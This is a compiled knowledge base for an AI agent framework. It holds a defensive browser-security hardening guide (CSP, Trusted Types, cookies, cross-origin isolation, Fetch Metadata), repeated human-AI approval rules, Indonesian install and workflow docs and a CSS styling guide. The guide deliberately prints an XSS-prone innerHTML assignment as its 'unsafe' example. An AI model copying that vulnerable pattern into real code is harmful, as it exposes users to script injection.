element.innerHTML = `Hello, ${untrustedName}!`;

// Safe
element.textContent = `Hello, ${untrustedName}!`;
```

Trusted Types can enforce this pattern at runtime by blocking string assignments to dangerous sinks. Deploying it is a CSP enforcement step with real breakage risk — see §3.3.

### 1.3 Secure Cookies
Ensure new cookies are configured securely by default.
- **DO**: Prefer naming cookies with the `__Host-` prefix when they'll only be used by one domain. This requires the `Secure` and `Path=/` attributes to be set, and the `Domain` attribute to be omitted. This protects against same-site and network attackers.
- **DO**: Prefer naming cookies with the `__Secure-` prefix when `__Host-` isn't appropriate. This requires the `Secure` attribute, and protects against network attackers.
- **DO**: Explicitly set `SameSite=Lax` for standard first-party cookies.
- **DO**: If your application will be embedded as an iframe in third-party contexts, use `SameSite=None; Secure; Partitioned`.
- **DO NOT**: Rely on unpartitioned `SameSite=None` — these are being systematically blocked for tracking prevention.

```http
Set-Cookie: __Host-session_id=value; SameSite=Lax; HttpOnly; Secure; Path=/
Set-Cookie: third_party_var=value; SameSite=None; Secure; Partitioned
```

### 1.4 Clickjacking Protection (Frame-Ancestors & X-Frame-Options)
Clickjacking protection is easy to deploy, carries extremely low risk of breaking legitimate functionality, and provides immediate defense against malicious UI redressing.
- **DO**: Set the `X-Frame-Options: SAMEORIGIN` header to prevent other sites from embedding your pages in an iframe (or use `DENY` if you should never be embedded).
- **DO**: For fine-grained control, use `frame-ancestors 'self'` (or specified trusted domains) in your CSP header.

```http
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;
```

### 1.5 Secure Window Messaging (postMessage)
If your application communicates with other origins using `window.postMessage`, you must strictly validate the sender and receiver.
- **DO**: Always validate the `event.origin` of incoming messages on the receiver side using strict equality against a list of trusted origins. Do **not** trust wildcards (`*`) or unverified payloads.
- **DO**: Always specify a target origin (rather than the wildcard `*`) when calling `postMessage` to send sensitive data, ensuring only the intended origin can receive it.
- **DO**: Validate and sanitize the properties of incoming message payloads before performing operations or writing them to DOM sinks. Manual JSON serialization is unnecessary as `postMessage` handles object cloning internally.

```javascript
// Receiver (Safe - traditional string check)
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-origin.com') return;
  const data = event.data;
  if (data && data.action === 'update') {
    // Process data safely
  }
});

// Sender (Safe)
targetWindow.postMessage({ action: 'update' }, 'https://trusted-origin.com');
```

## Phase 2: Discovery & Data Collection (Prerequisites)

Do not blindly apply strict policies to an existing application. You must first understand the application's constraints by collecting data.

### 2.1 Inspect the Application
Before turning anything on, gather facts:
- **Grep for existing security headers** in server config, middleware, CDN/edge config, and meta tags: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Permissions-Policy`, `Cross-Origin-*`, `Access-Control-*`, `Timing-Allow-Origin`, `Reporting-Endpoints`.
- **Enumerate inline scripts and styles** in server-rendered templates and static HTML — these will need nonces, hashes, or refactoring.
- **List third-party script origins** loaded by the app (analytics, ads, tag managers, CDNs). These dictate what `script-src` must allow or whether `'strict-dynamic'` is viable.
- **Identify popup-dependent flows**: OAuth, payment gateways, SSO. These constrain COOP choices.
- **Identify cross-origin embeds and embedders**: iframes the app loads, and sites that embed the app. These constrain COEP/CORP/`frame-ancestors`.
- **Enumerate required browser features**: List any features (camera, geolocation, microphone, fullscreen) used by the app or embedded third-party widgets to inform `Permissions-Policy`.
- **Identify dynamic dependencies**: Check if third-party scripts are versioned or if they receive silent updates, determining if `SRI` can be used.
- **Map cross-site integrations**: List all incoming Webhooks, cross-site APIs, or SSO redirect endpoints so `Fetch Metadata` resource isolation policies don't break them.

### 2.2 Deploy Report-Only Policies
Use "Report-Only" headers to identify potential breakages before they happen.
- **DO**: Use report-only headers to dry-run policies without enforcement. Standard report-only headers include:
  - `Content-Security-Policy-Report-Only` for CSP rules.
  - `Cross-Origin-Opener-Policy-Report-Only` for COOP isolation.
  - `Cross-Origin-Embedder-Policy-Report-Only` for COEP isolation.
  - `Document-Policy-Report-Only` for document features.
- **DO**: Define a `Reporting-Endpoints` header so violations have somewhere to go, and reference its name from `report-to`. Recommend setting an endpoint named `default`, which will automatically capture deprecation and crash reports.
- **DO**: Run report-only for long enough to cover real traffic patterns (typically days to weeks), not just synthetic testing.

**Example headers:**
```http
Reporting-Endpoints: default="https://reports.example/default", main-endpoint="https://reports.example/main"
Content-Security-Policy-Report-Only: script-src 'nonce-{RANDOM}' 'strict-dynamic' 'report-sample'; object-src 'none'; base-uri 'none'; report-to main-endpoint;
```

The `'strict-dynamic'`, `https:`, and `'unsafe-inline'` tokens together form a backwards-compatibility ladder: modern browsers honor `'strict-dynamic'` (nonce-propagating) and ignore the others; older browsers fall back to `https:`; very old browsers fall back to `'unsafe-inline'`. The fallbacks are harmless on any browser that supports a stricter token.

**Managing report false-positives**: Reporting endpoints receive a significant volume of false-positive violation reports caused by client-side middleware, aggressive browser extensions, ancient browsers, web crawlers, or antivirus scanners. When analyzing report-only logs, focus on high-frequency patterns from modern user-agents and filter out noise before making deployment decisions. Specifically:
- **Filter out noise**: Ignore reports sent by old browsers with known bugs triggering spurious violations, reports for markup known to be injected by popular browser extensions or client-side middleware (like identical reports seen across many distinct applications), and reports that do not contain enough information to debug.
- **Ignore low-volume reports**: If a policy is deployed, a low violation volume often indicates a false positive that can be safely ignored.
- **Leverage `'report-sample'`**: Always include `'report-sample'` in your `script-src` directives. This instructs the browser to include the first 40 characters of the violating script or inline code snippet in the violation report, which makes debugging much easier.

### 2.3 Data Hygiene for Reports
- **DO NOT**: Include sensitive data (PII, authentication tokens, session identifiers, query strings with secrets) in logs or violation reports. Mask or omit them at the edge before they reach the reporting endpoint.

### 2.4 Automated Discovery via Browser APIs and DevTools
- **Reporting API**: Use `Reporting-Endpoints` in combination with report-only headers (e.g., `Content-Security-Policy-Report-Only`, `Document-Policy-Report-Only`) to have the browser automatically post violations to your server.
- **Browser DevTools**: Use the **Issues Tab** in modern browsers (e.g., Chrome DevTools). It automatically surfaces blocked resources, mixed content, third-party cookie deprecation warnings, and feature policy violations without you having to crawl the codebase manually.

## Phase 3: Interpreting Results & Enforcement

After collecting data, decide how to proceed with enforcement. Phase 3 has two tracks that run in parallel, not in sequence:

- **Core enforcement (data-driven rollouts)** — high-breakage-risk policies that depend on Phase 2 report-only data. These are the rollouts you stage and watch.
- **Companion policies (deploy in parallel)** — lower-risk headers that can be turned on alongside or before the core work, with little or no Phase 2 discovery required.

### Core enforcement (data-driven rollouts)

#### 3.1 Analyzing CSP Reports

When reviewing CSP violation reports, first separate the noise (per §2.2) from legitimate application issues. For violations that appear to be caused by an incompatibility in your application (usually those where the "Sample" or "Blocked URI" seem like legitimate scripts or assets that might be present in your markup):
- **Code Search**: Search your codebase for the offending script source, URL, or hash to see if it is present in your code, dynamic server templates, or static HTML files.
- **Console Auditing**: Open the page that triggered the violation (the "Document URI" in the report) using the same browser, and check the developer tools/console for CSP violations while exercising as much application functionality as possible (some violations only trigger on specific user interactions).

Once filtered and triaged, analyze the reports against the following common scenarios:

- **Scenario**: Many violations for inline scripts.
  - **Condition**: The app uses a framework that relies on inline scripts.
  - **Decision**: Implement Nonces (server-rendered) or Hashes (static) before enforcing.
- **Scenario**: Violations for third-party analytics scripts.
  - **Condition**: The scripts are required.
  - **Decision**: Use `'strict-dynamic'` with a per-request nonce so the analytics loader can attach its dependencies. Do **not** add the analytics origin to a URL allowlist — domain allowlists are bypassable via open redirects, JSONP, and dependency injection on the listed origin.
- **Scenario**: Trusted Types violations on specific sinks.
  - **Condition**: Legacy code paths still write strings to `innerHTML` etc.
  - **Decision**: Refactor those sinks (per §1.2) or route them through a Trusted Types policy (§3.3) before enforcing.

#### 3.2 Transitioning to CSP Enforcement
Only move to enforced mode when:
1. Violations in the report-only logs have dropped to near zero or are accounted for.
2. Reporting remains wired up after the switch — keep `report-to` on the enforced header so regressions are visible.

**Key directives to set:**
- `script-src` with nonces or hashes — this is the core directive of any CSP and the primary mechanism to prevent XSS.
- `base-uri 'none'` to block `<base>` hijacking. Legacy directives like `object-src 'none'` can be omitted in modern, post-Flash web environments.
- *Optional but potentially breaking*: `default-src 'self'` is sometimes used as a fallback for unspecified fetch directives, but it dramatically complicates deployment and has little security value beyond `script-src`. It is generally safer to focus on robust `script-src` enforcement first.
- *Optional*: `form-action 'self'` prevents form submissions to attacker-controlled origins.
- *Optional*: `upgrade-insecure-requests` auto-upgrades subresource HTTP loads to HTTPS, though modern browsers largely auto-upgrade mixed content anyway.

**Enforced Header Example (CSP with reporting):**
```http
Reporting-Endpoints: main-endpoint="https://reports.example/main"
Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic' 'report-sample'; object-src 'none'; base-uri 'none'; report-to main-endpoint;
```

HTML for nonce-based CSP:
```html
<script nonce="{RANDOM}" src="https://example.com/script.js"></script>
```

For static/cached HTML (SPAs) where a per-response nonce is not possible, use hash-based CSP: hash each inline script and list the hashes in `script-src`.

**Avoid**: URL allowlists like `script-src https://cdn.example.com` — they are easily bypassed by open redirects, JSONP endpoints, and dependency injection on the allowed origin.

#### 3.3 Trusted Types Enforcement
Trusted Types enforces the §1.2 source-level guidance at runtime: once enabled, the browser blocks string assignments to dangerous sinks unless they pass through a named policy.

- **Incremental Rollout Strategy**: While full enforcement carries real breakage risk, you do not need to do everything at once. A highly viable approach is to define and roll out a policy for a small portion of the application under refactoring, and slowly expand its usage as you replace sinks. This simplifies eventual global enforcement without short-term breakage risk.
- **Prerequisite**: Trusted Types requires framework cooperation. If the app's framework (or any third-party widget that writes to DOM sinks) does not produce `TrustedHTML` / `TrustedScript` values, the policy cannot be enforced without breaking that code. Audit framework support before starting the report-only rollout.
- **Prerequisite**: The code-level sink refactor from Phase 1 is a prerequisite for complete Trusted Types enforcement. (Standard CSP `script-src` enforcement, by contrast, does not police DOM sinks and can be deployed without refactoring them.)
- **DO**: Roll out via `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'` first to find every offending sink.
- **DO**: Define a single named policy that performs sanitization (or escaping) and route all sink writes through it.
- **DO**: Move to full global `Content-Security-Policy: require-trusted-types-for 'script'` enforcement once the policy has been successfully integrated and violations in report-only logs drop to zero.

```javascript
if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('escapePolicy', {
    createHTML: str => str.replace(/</g, '&lt;').replace(/>/g, '&gt;')
  });
  el.innerHTML = policy.createHTML(untrustedString);
}
```

#### 3.4 Cross-Origin Opener Policy (COOP)

Lowest-risk of the three. Deploy if the app is **not** an OAuth provider, payment processor, or otherwise expected to be reached from an opener.

- **DO**: Use `Cross-Origin-Opener-Policy: same-origin-allow-popups` — prevents a malicious opener from mounting XS-leaks attacks while still allowing OAuth and payment flows that *the app itself* initiates.
- **DO NOT**: Jump straight to `same-origin` unless you have explicitly verified that no integrations rely on cross-origin `window.opener` access.

#### 3.5 Cross-Origin Resource Policy (CORP)

Set CORP explicitly on each response based on whether it should be embeddable in other contexts. Two core benefits: it protects resources from malicious cross-origin reads, and ensures compatibility when pages request stronger client-side isolation.

- **DO**: Default to `Cross-Origin-Resource-Policy: same-origin` for app-internal resources (authenticated data, user session JSON, restricted internal scripts).
- **DO**: Use `same-site` for endpoints utilized across subdomains of the same eTLD+1.
- **DO**: Provide `cross-origin` exclusively for resources created for generic embedding or widely cached delivery (e.g., static shared assets or public CDNs).

#### 3.6 Cross-Origin Isolation

Highest deployment breakage risk. You only need to deploy this infrastructure if the application requires features relying on `SharedArrayBuffer` (e.g., WebAssembly multi-threading or shared memory architectures). If not required, skip this policy group.

- **Preferred path (Chromium environments)**: Enable `Document-Isolation-Policy: isolate-and-credentialless`. This provides client-side isolation comparable to COEP while instructing the browser to strip cookies and authentication credentials from non-CORS cross-origin resource fetches rather than blocking them outright. Note that this is supported primarily in Chrome (142+) and other vendors have not yet shown interest, so evaluate carefully based on your target audience. Apps that need to *block* cross-origin resources lacking explicit CORP opt-in (rather than load them with credentials stripped) can adopt `isolate-and-require-corp` instead. This is stricter and harder to deploy — it requires the same subresource audit as the cross-browser path below.
- **Cross-browser path (Complex enforcement)**: Require `Cross-Origin-Opener-Policy: same-origin` coupled with `Cross-Origin-Embedder-Policy: require-corp`. Every embedded subresource (images, styles, external media) MUST serve an explicit `Cross-Origin-Resource-Policy` header or the browser will prevent it from loading.

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

#### 3.7 Fetch Metadata (Resource Isolation)
Server-side enforcement that uses `Sec-Fetch-*` request headers to reject suspicious cross-site requests. Requires the cross-site integration mapping from §2.1 before enforcing.

- **DO**: Implement a server-side resource isolation policy that checks `Sec-Fetch-*` headers and rejects `cross-site` requests for non-navigational endpoints.
- **DO**: Reject disallowed requests *before* authentication or authorization checks, so the response does not leak timing information about whether a resource or session exists.
- **DO**: Include `Vary: Sec-Fetch-Dest, Sec-Fetch-Mode, Sec-Fetch-Site` to prevent intermediate caches (CDNs) from serving cached responses to attackers.
- **CAUTION**: `same-site` trusts every subdomain under your eTLD+1. If any subdomain hosts user-generated content, a legacy app, or otherwise untrusted code, drop `same-site` from the allowlist and accept only `same-origin` and `none`.
- **CAUTION**: Misconfiguring these checks will block legitimate API requests coming from cross-site integrations, SSO handlers, or Webhooks. Ensure you log and test your `Sec-Fetch-*` constraints beforehand.

```javascript
app.use((req, res, next) => {
  const site = req.get('Sec-Fetch-Site');
  const mode = req.get('Sec-Fetch-Mode');
  const dest = req.get('Sec-Fetch-Dest');

  if (!site) return next(); // Fallback for legacy browsers

  if (['same-origin', 'same-site', 'none'].includes(site)) return next();

  // Allow standard navigate GET requests (link clicks)
  if (site === 'cross-site' && mode === 'navigate' && req.method === 'GET' && !['object', 'embed'].includes(dest)) {
    return next();
  }

  res.status(403).send('Forbidden');
});
```

### Companion policies (deploy in parallel)

These carry significantly lower breakage risk than the core enforcement track. They can be deployed alongside — or before — the CSP and isolation rollouts.

#### HTTP Strict Transport Security (HSTS)
- **DO**: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to force HTTPS.
- **TIP**: In production rollout, start with a short `max-age` (e.g., 300 seconds) and incrementally increase to 1 year. A misconfigured HSTS with a long max-age can render the site permanently inaccessible until the cache expires in every browser that saw it.

#### X-Content-Type-Options
- **DO**: Set `X-Content-Type-Options: nosniff` to block MIME-type sniffing.
- **DO**: Ensure the server serves correct `Content-Type` headers for all resources (`application/javascript` for scripts, `application/json` for APIs, `text/html` for documents, etc.) so the browser can strictly enforce the `nosniff` constraint.

#### Referrer Policy
- **DO**: Use `Referrer-Policy: strict-origin-when-cross-origin` as a safe default.

#### Permissions Policy
- **DO**: Disable unused browser features (camera, geolocation, microphone) for the page and iframes using Structured Fields syntax.
- **DO**: When delegating features to an iframe, use the `allow` attribute in HTML *in addition* to the header.
- **CAUTION**: Unintentionally blocking a delegated feature will cause silent failures in third-party widgets (like embedded video players or payment gateways). Audit third-party dependencies before blocking.

```http
Permissions-Policy: camera=(), geolocation=(), microphone=()
```

```html
<iframe src="https://trusted-video.com/player" allow="fullscreen; camera"></iframe>
```

#### Subresource Integrity (SRI)
- **DO**: Use the `integrity` attribute with a cryptographic hash (preferring `sha256` or `sha512`) when loading third-party scripts, combined with `crossorigin="anonymous"`.
- **DO**: Ensure the server/CDN sends an appropriate `Access-Control-Allow-Origin` header so the browser can compute the hash.
- **DO NOT**: Use SRI for dynamic or unversioned assets — silent updates will cause script execution to fail. SRI is strictly for immutable, versioned assets.

```html
<script src="https://cdn.example.com/lib.js" integrity="sha256-H8df...39v" crossorigin="anonymous"></script>
```

#### Cross-Origin Resource Sharing (CORS)
CORS is a permission grant, not a defense — it tells the browser which cross-origin reads to allow. The risk is misconfiguring it as too permissive.

- **DO**: Validate the `Origin` header on the server and set `Access-Control-Allow-Origin` dynamically to specific origins (rather than wildcard `*`).
- **DO NOT**: Use wildcard `*` for `Access-Control-Allow-Origin` if `Access-Control-Allow-Credentials: true` is required — the browser will reject the response.
- **DO**: Handle preflight (`OPTIONS`) requests by returning appropriate headers before processing data.

```http
Access-Control-Allow-Origin: https://trusted-app.com
Access-Control-Allow-Credentials: true
```

#### Clear-Site-Data (Logout)
- **DO**: Use `Clear-Site-Data` on logout endpoints to ensure complete session termination.

```http
Clear-Site-Data: "cookies", "storage", "cache"
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_COLLABORATION_CONTRACT.MD

# 🤝 HUMAN-AI COLLABORATION CONTRACT

## 1. Documentation First
Documentation is not the byproduct; it is the blueprint. No implementation should occur without a prior design or algorithm document.

## 2. The Approval Protocol
- **No Approval, No Code**: AI must never modify business logic or core architecture without explicit user approval (OKE/APPROVE).
- **Traceability**: Every commit or major change must refer to a specific Plan or Audit ID.

## 3. Specialist Roles
- The system operates through **Agents** (Specialists) overseen by an **Orchestrator**.
- Each agent brings a specific "Lens" (Security, UX, SEO, etc.) to ensure a multi-dimensional perspective on quality.


--- APPENDED FROM COLLABORATION_CONTRACT.md ---
# 🤝 HUMAN-AI COLLABORATION CONTRACT

## 1. Documentation First
Documentation is not the byproduct; it is the blueprint. No implementation should occur without a prior design or algorithm document.

## 2. The Approval Protocol
- **No Approval, No Code**: AI must never modify business logic or core architecture without explicit user approval (OKE/APPROVE).
- **Traceability**: Every commit or major change must refer to a specific Plan or Audit ID.

## 3. Specialist Roles
- The system operates through **Agents** (Specialists) overseen by an **Orchestrator**.
- Each agent brings a specific "Lens" (Security, UX, SEO, etc.) to ensure a multi-dimensional perspective on quality.


--- APPENDED FROM COLLABORATION_CONTRACT.md ---
# 🤝 HUMAN-AI COLLABORATION CONTRACT

## 1. Documentation First
Documentation is not the byproduct; it is the blueprint. No implementation should occur without a prior design or algorithm document.

## 2. The Approval Protocol
- **No Approval, No Code**: AI must never modify business logic or core architecture without explicit user approval (OKE/APPROVE).
- **Traceability**: Every commit or major change must refer to a specific Plan or Audit ID.

## 3. Specialist Roles
- The system operates through **Agents** (Specialists) overseen by an **Orchestrator**.
- Each agent brings a specific "Lens" (Security, UX, SEO, etc.) to ensure a multi-dimensional perspective on quality.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, tdd, vcs, marketing, psychology, nexus_institutionalized]

### 📘 KNOWLEDGE: NEXUS_INSTALLATION_WORKFLOW.MD

# 🛠️ Installation & Uninstallation Workflow (v3.1)
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Dokumen ini menjelaskan protokol standar untuk memasang dan melepas engine Nexus AI pada sebuah project untuk memastikan keamanan data dan kerapihan struktur.

---

## 1. 📥 Alur Kerja Instalasi (Hardened Mode)

Proses instalasi dirancang untuk membuat lingkungan kerja AI yang mandiri (*self-contained*) dan aman dari eksposur publik.

### Langkah-langkah:
1.  **Eksekusi Command**: Menjalankan `nexus install` atau `install.ps1`.
2.  **Pengecekan Environment**: Engine mendeteksi direktori project dan keberadaan file `.gitignore`.
3.  **Hardening (Auto-Gitignore)**: 
    *   Engine secara otomatis menambahkan entri `nexus/` ke file `.gitignore`.
    *   **Tujuan**: Mencegah data audit lokal dan memori agent masuk ke repositori git publik.
4.  **Security Barrier (.htaccess)**:
    *   Membuat file `.htaccess` di dalam folder `nexus/` dengan kebijakan `Deny from all`.
    *   **Tujuan**: Memblokir akses langsung browser ke file log dan dokumentasi sensitif.
5.  **Strukturisasi**:
    *   Memasang folder `agent/`, `workflow/`, `documentation/`, `memory/`, dan `logs/`.
    *   Menyalin `README.md` dan `ALGORITMA_INTEGRASI.md` ke dalam folder `nexus/`.

---

## 2. 📤 Alur Kerja Uninstalasi (Safe Mode)

Proses uninstalasi menggunakan protokol **Selective Deletion** untuk melindungi aset intelektual (Audit & Planning) yang telah dihasilkan.

### Langkah-langkah:
1.  **Eksekusi Command**: Menjalankan `nexus uninstall` atau `uninstall.ps1`.
2.  **Peringatan & Konfirmasi**: User diberikan peringatan keras tentang penghapusan engine dan memori.
3.  **Selective Deletion**:
    *   🗑️ **Dihapus**: Folder `agent/`, `memory/`, `logs/`, dan file sistem (`.htaccess`, `README.md`).
    *   🛡️ **Dipertahankan**: Folder `documentation/` (berisi `planning/`, `audit/`, `records/`, `summary/`).
4.  **Final State**: Engine terlepas dari project, namun seluruh riwayat perubahan dan hasil audit tetap tersimpan untuk referensi manual developer.

---

## 📊 Visualisasi Alur

```mermaid
graph TD
    subgraph Installation
    A[nexus install] --> B{Check .gitignore}
    B -- No --> C[Create .gitignore]
    B -- Yes --> D[Append nexus/]
    D --> E[Create .htaccess]
    E --> F[Copy Assets to /nexus]
    end

    subgraph Uninstallation
    G[nexus uninstall] --> H[Prompt User]
    H -- Yes --> I{Iterate /nexus}
    I -- Item is 'documentation' --> J[KEEP]
    I -- Item is other --> K[DELETE]
    K --> L[Finish]
    end
```

---

## 📌 Aturan Emas (Golden Rules)
1.  **Jangan hapus folder `documentation` secara manual** kecuali Anda benar-benar ingin membuang seluruh riwayat riset project.
2.  **Selalu pastikan `.gitignore` aktif** sebelum melakukan `git commit` pertama setelah instalasi Nexus.
3.  **Gunakan Safe Uninstall** jika Anda ingin mengupgrade versi engine tanpa merusak data memori yang sudah ada.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [vcs]

### 📘 KNOWLEDGE: NEXUS_INTEGRATION_ALGORITHM.MD

# 🛠 ALGORITMA INTEGRASI: Human-AI Nexus (Automated Engine Version)

Dokumen ini adalah **Sumber Kebenaran (Source of Truth)** untuk logika orkestrasi yang dijalankan oleh `NexusEngine`. Seluruh instruksi di sini diimplementasikan ke dalam kode program untuk memastikan konsistensi antara dokumentasi dan eksekusi.

## 📋 1. Setup & Inisialisasi

Sistem mengawali setiap siklus dengan fase **Intelligence Discovery**:
1.  **Skill Discovery**: Engine memetakan seluruh modul di folder `skill/` (Frontend, Backend, Security, dll).
2.  **Memory Access**: Engine membaca folder `records/` dan `knowledge/` untuk mendapatkan konteks dari sesi sebelumnya.

```bash
# Inisialisasi otomatis via Nexus Engine (GitHub Version)
npx github:Faisal-Trainer/Human-AI-Nexus nexus run
```

## 📋 2. Algoritma Audit (Dev-Centric Logic)

Fase audit adalah tahap penentu kualitas. Alur kerja ditentukan oleh tingkat pengalaman Developer (User):

### IF (Mode == "Learning")
- **Kondisi**: Developer baru atau membutuhkan edukasi teknis mendalam.
- **Tindakan**: 
    1. Orchestrator memanggil seluruh **Agent Spesialis** (Cyber Security, UX Engineer, SEO Specialist, Database Architect).
    2. Setiap Agent menghasilkan satu laporan mandiri di folder `audit/`.
- **Tujuan**: Memberikan transparansi penuh dan bahan pembelajaran dari tiap sudut pandang ahli.

### ELSE (Mode == "Efficient")
- **Kondisi**: Developer berpengalaman atau membutuhkan eksekusi cepat.
- **Tindakan**:
    1. Orchestrator memanggil **Project Manager (PM)**.
    2. PM melakukan scanning dan menulis satu laporan konsolidasi yang merangkum seluruh temuan utama.
- **Tujuan**: Efisiensi waktu dan fokus pada masalah strategis.

## 📋 3. Nexus Workflow (Siklus Otomatis)

Engine menjalankan siklus berikut secara rekursif:

1.  **Phase: Audit**: Menjalankan algoritma di atas (Learning/Efficient).
    - **Security Guardrail**: Engine meminta izin eksplisit sebelum menscan `.env`, `package.json`, dan `composer.json`.
2.  **Phase: Planning**: 
    - Input: Hasil audit terbaru (termasuk temuan keamanan jika diizinkan).
    - Action: PM menyusun dokumen di `planning/` berisi daftar tugas (TODO list).
3.  **Phase: Approval**:
    - Engine **WAJIB** berhenti dan menunggu input User (Ketik: "OKE" atau "APPROVE").
4.  **Phase: Execution**:
    - Agent Engineer mengeksekusi tugas sesuai rencana yang telah disetujui.
5.  **Phase: Recording**:
    - Mencatat hasil ke `records/` dan memperbarui memori di `knowledge/`.

## ⚠️ Aturan Emas (The Golden Rules)

1.  **Logic-First**: Kode program dilarang menyimpang dari algoritma yang tertulis di dokumen ini.
2.  **Zero Flaws Enforcement**: Siklus audit tidak boleh berhenti sebelum status proyek mencapai "Zero Flaws" sesuai [STANDAR_ZERO_FLAWS.md](STANDAR_ZERO_FLAWS.md).
3.  **Traceability**: Setiap file yang dihasilkan harus menyertakan referensi ke dokumen sumbernya (misal: Plan merujuk pada Audit ID tertentu).

---
*Dokumen ini mengatur bagaimana software dan manusia berkolaborasi dalam ekosistem Nexus.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, database, vcs, marketing, psychology]

### 📘 KNOWLEDGE: NEXUS_SUPERPOWERS_WORKFLOW.MD

# ⚡ NEXUS SUPERPOWERS WORKFLOW (Institutional Memory)

Dokumen ini mengadopsi prinsip **Superpowers** untuk menjamin kedisiplinan tingkat tinggi dalam pengembangan perangkat lunak.

## 1. Hukum Besi (The Iron Laws)
- **TDD (Test-Driven Development)**: Dilarang menulis kode produksi sebelum ada pengujian (test) yang gagal terlebih dahulu.
- **Systematic Debugging**: Dilarang melakukan perbaikan (fix) sebelum melakukan investigasi akar masalah (root cause).
- **Evidence-Based Verification**: Dilarang mengklaim tugas selesai tanpa bukti (evidence) berupa log eksekusi atau hasil test yang valid.

## 2. Gerbang Persetujuan (Approval Gates)
Gunakan checkpoint manusia pada titik-titik kritis:
1. **Design Gate**: Setujui desain sebelum lanjut ke perencanaan.
2. **Plan Gate**: Setujui rencana sebelum menulis kode.
3. **Review Gate**: Setujui hasil implementasi sebelum melakukan merge/commit.

## 3. Systematic Debugging Framework
1. **Observation**: Catat perilaku aneh.
2. **Hypothesis**: Buat hipotesis penyebab.
3. **Experiment**: Lakukan pengetesan untuk membuktikan hipotesis.
4. **Fix & Verify**: Terapkan solusi dan verifikasi dengan test.

---
*Status: Institutional Knowledge (Workflow Discipline).*
*Referenced from: amplifier-bundle-superpowers.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, tdd, vcs, nexus_institutionalized]

### 📘 KNOWLEDGE: NEXUS_STABILIZATION_RECORD.MD

# Execution Record: System Stabilization Cycle
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Date**: 2026-05-10
**Audit Ref**: AUDIT-STABILIZATION-001

## 📊 Summary of Actions

### 1. NexusEngine.js Refactor
- **Status**: SUCCESS
- **Changes**:
    - Deduplicated methods `getSemanticTags` and `globRecursive`.
    - Fixed `this.nexusPath` -> `this.nexusDataPath` (resolved potential runtime crash).
    - Consolidated 8 redundant path assignments in the constructor.
    - Improved `globRecursive` to handle Windows path separators natively.

### 2. Git Hygiene
- **Status**: SUCCESS
- **Changes**:
    - Updated `.gitignore` to exclude:
        - `knowledge/*_SESSION_HISTORY_ARCHIVE.md`
        - `knowledge/*_LOG.md`
        - `memory/distilled/performance/*.MD`
        - `memory/operational/records/*.json`

### 3. Workflow Consolidation
- **Status**: SUCCESS
- **Action**: Executed `scratch/sync_workflows.js`.
- **Result**: Migrated all unique workflows to `agent/workflows/`. This directory is now the official Source of Truth. Redundant folders are preserved but marked as secondary/distribution mirrors.

### 4. Test Expansion
- **Status**: SCAFFOLDED
- **Result**: Created 3 new test files in `tests/TDD/`:
    - `MemoryGovernor.test.js`
    - `Orchestrator.test.js`
    - `Machinist.test.js`

## 🛡️ System Integrity Verification
- **Engine Load**: PASS
- **Path Resolution**: PASS (Verified dynamic mapping)
- **Method Collision**: RESOLVED

---
**Verification Signature**: [Nexus Engine | Antigravity AI]


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [tdd, vcs]

### 📘 KNOWLEDGE: NEXUS_BRANDED-SELECT-STYLING.MD

# Branded Select Styling
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The customizable select API offers a declarative, CSS-driven way to style `<select>` elements to perfectly match your brand's design system. By opting into `appearance: base-select`, you gain access to the internal shadow DOM of the select element, allowing you to style the button, the options picker list, the arrow icon, and the checkmark indicator using standard CSS properties.

Previously, achieving a fully branded select required rebuilding the control from scratch with JavaScript, which often broke accessibility, keyboard navigation, and native form integration. With `appearance: base-select`, you get a custom look while the browser handles focus management, top-layer rendering, and accessibility bindings.

## How to Implement

To implement branded select styling:

1. **Opt-in to customization:** Apply `appearance: base-select` to both the `<select>` element and the `::picker(select)` pseudo-element (which targets the drop-down list of options).
2. **Structure the custom button (Optional):** Define a `<button>` element directly inside the `<select>` to replace the default trigger. Use the `<selectedcontent>` element inside this button to represent the text or content of the currently selected option.
3. **Style the Picker List:** Use the `::picker(select)` pseudo-element to apply typography, background colors, borders, and shadows to the dropdown list. The browser renders this in the top-layer, making `z-index` conflicts a thing of the past.
4. **Style Internal Icons:**
   - Use `select::picker-icon` to style or replace the arrow icon.
   - Use `option::checkmark` to style the checkmark indicator next to the active option.
5. **Style Options:** Apply styles to `<option>` elements for hover states, padding, and layout.

## Example Code: Branded Courier Select

The following example demonstrates a custom select styled with a monospace font and dashed borders to match a specific "parcel" brand aesthetic.

```css
/* Enable customization for the select and its picker */
.brand-select,
.brand-select::picker(select) {
  appearance: base-select;
}

/* Style the visible trigger button */
.brand-select {
  font-family: 'Courier New', monospace;
  background-color: #fffaf0;
  color: #8b4513;
  border: 2px dashed #8b4513;
  border-radius: 4px;
  padding: 0.75rem;
  font-size: 1rem;
  cursor: pointer;
}

/* Style the dropdown options list */
.brand-select::picker(select) {
  font-family: 'Courier New', monospace;
  background-color: #fffaf0;
  border: 2px dashed #8b4513;
  border-radius: 4px;
  padding: 0.5rem;
}

/* Customize internal part colors to match text */
.brand-select::picker-icon {
  color: #8b4513;
}

.brand-select option::checkmark {
  color: #8b4513;
}

/* Style individual options and hover effects */
.brand-select option {
  padding: 0.5rem;
  border-radius: 4px;
  color: #8b4513;
  cursor: pointer;
}

.brand-select option:hover {
  background-color: #fdf5e6;
}
```

```html
<label for="preferences">Select shipping preference</label>
<select class="brand-select" id="preferences" name="preferences">
